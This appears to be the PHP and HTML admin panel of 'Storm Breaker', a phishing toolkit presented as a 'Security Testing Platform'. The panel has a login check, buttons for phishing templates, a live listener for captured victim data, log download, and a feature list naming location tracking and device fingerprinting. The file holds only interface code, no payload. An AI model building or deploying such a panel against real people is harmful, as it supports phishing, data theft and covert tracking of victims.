<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name=”viewport” content=”width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Storm Breaker - Admin Panel</title>
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .header-bar {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px 30px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .header-bar h1 {
            color: var(--primary);
            font-size: 2.5rem;
            margin: 0;
        }
        .dashboard-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .btn-modern {
            border: none;
            border-radius: 10px;
            padding: 12px 24px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            margin: 5px;
        }
        .btn-modern:hover { transform: translateY(-2px); }
        .btn-primary-modern { background: linear-gradient(135deg, #3498db 0%, #2980b9 100%); color: white; }
        .btn-success-modern { background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%); color: white; }
        .btn-danger-modern { background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; }
        .btn-warning-modern { background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); color: white; }
        textarea#result {
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            width: 100%;
        }
        .quick-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 9999;
            animation: fadeIn 0.3s ease;
        }
        
        .modal-overlay.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .modal-container {
            background: white;
            border-radius: 20px;
            max-width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
        }
        
        .modal-header {
            padding: 25px 30px;
            border-bottom: 2px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px 20px 0 0;
            color: white;
        }
        
        .modal-header h2 {
            margin: 0;
            font-size: 1.5rem;
        }
        
        .modal-close {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            font-size: 1.5rem;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .modal-close:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(90deg);
        }
        
        .modal-body {
            padding: 30px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(50px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>

</head>


<body id="ourbody" onload="check_new_version()">

<div class="header-bar">
    <h1><i class="fas fa-bolt"></i> Storm Breaker</h1>
    <p style="color: #666; margin: 10px 0 0 0;">Security Testing Platform</p>
</div>

<div class="dashboard-card">
    <h3><i class="fas fa-link"></i> Phishing Templates</h3>
    
    <div class="quick-actions" style="margin-bottom: 20px;">
        <button class="btn-primary-modern btn-modern" onclick="location.href='template-selector.php'">
            <i class="fas fa-th-large"></i> Template Selector
        </button>
        <button class="btn-primary-modern btn-modern" onclick="location.href='gallery.php'">
            <i class="fas fa-images"></i> Image Gallery
        </button>
        <button class="btn-success-modern btn-modern" onclick="location.href='panel-v5.php'">
            <i class="fas fa-rocket"></i> V5 Panel
        </button>
    </div>
    
    <div id="links"></div>
</div>

<div class="dashboard-card">
    <h3><i class="fas fa-terminal"></i> Live Monitoring</h3>
    <textarea class="form-control" placeholder="Waiting for data..." id="result" rows="15"></textarea>
    
    <div class="quick-actions" style="margin-top: 20px;">
        <button class="btn-danger-modern btn-modern" id="btn-listen">
            <i class="fas fa-stop"></i> Stop Listener
        </button>
        <button class="btn-primary-modern btn-modern" onclick="location.href='gallery.php'">
            <i class="fas fa-images"></i> Gallery
        </button>
        <button class="btn-success-modern btn-modern" onclick="saveTextAsFile(result.value,'log.txt')">
            <i class="fas fa-download"></i> Download Logs
        </button>
        <button class="btn-warning-modern btn-modern" id="btn-clear">
            <i class="fas fa-trash"></i> Clear Logs
        </button>
        <button class="btn-secondary-modern btn-modern" onclick="showInfoModal()">
            <i class="fas fa-info-circle"></i> Info
        </button>
    </div>
</div>

<!-- Modal System -->
<div id="modal-overlay" class="modal-overlay" onclick="closeModalOnOverlay(event)">
    <div class="modal-container" id="modal-content">
        <!-- Modal content will be dynamically inserted here -->
    </div>
</div>

</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>

<script>
// Modal System
function openModal(title, content) {
    const overlay = document.getElementById('modal-overlay');
    const modalContent = document.getElementById('modal-content');
    
    modalContent.innerHTML = `
        <div class="modal-header">
            <h2><i class="fas fa-bolt"></i> ${title}</h2>
            <button class="modal-close" onclick="closeModal()">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="modal-body">
            ${content}
        </div>
    `;
    
    overlay.classList.add('active');
}

function closeModal() {
    const overlay = document.getElementById('modal-overlay');
    overlay.classList.remove('active');
}

function closeModalOnOverlay(event) {
    if (event.target.id === 'modal-overlay') {
        closeModal();
    }
}

// ESC key to close modal
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closeModal();
    }
});

function showInfoModal() {
    const content = `
        <div style="text-align: center;">
            <i class="fas fa-bolt" style="font-size: 4rem; color: var(--primary); margin-bottom: 20px;"></i>
            <h3>Storm Breaker V3</h3>
            <p style="color: #666; margin: 20px 0;">Security Testing Platform</p>
            
            <div style="text-align: left; margin-top: 30px;">
                <h4><i class="fas fa-rocket"></i> Features</h4>
                <ul style="color: #666;">
                    <li>15+ Phishing Templates</li>
                    <li>Real-time Data Capture</li>
                    <li>Image Gallery</li>
                    <li>Location Tracking</li>
                    <li>Device Fingerprinting</li>
                </ul>
                
                <h4 style="margin-top: 20px;"><i class="fas fa-star"></i> Upgrade Available</h4>
                <p style="color: #666;">Try the enhanced V5 panel with advanced features!</p>
                <button class="btn-success-modern btn-modern" onclick="location.href='panel-v5.php'" style="width: 100%; margin-top: 10px;">
                    <i class="fas fa-arrow-right"></i> Upgrade to V5
                </button>
            </div>
        </div>
    `;
    
    openModal('About Storm Breaker', content);
}
</script>